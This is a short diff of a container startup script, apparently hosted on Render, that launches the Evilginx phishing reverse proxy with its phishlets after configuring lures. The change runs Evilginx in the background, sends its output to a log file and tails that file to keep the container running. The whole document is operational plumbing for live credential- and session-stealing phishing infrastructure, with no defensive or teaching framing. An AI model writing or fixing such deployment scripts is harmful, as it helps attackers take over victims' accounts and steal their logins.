@@ -14,6 +14,8 @@ lures get-url 0
 exit
 EOF
 
-# 3. Run Evilginx in the foreground to keep it alive and log errors
-# The 'exec' replaces the shell process with Evilginx, ensuring it stays running
-exec /app/evilginx -p /app/phishlets
+# 3. Start Evilginx in the background and log its output to a file
+/app/evilginx -p /app/phishlets > /app/evilginx.log 2>&1 &
+
+# 4. Keep the container running and print the log file to the Render console
+tail -f /app/evilginx.log
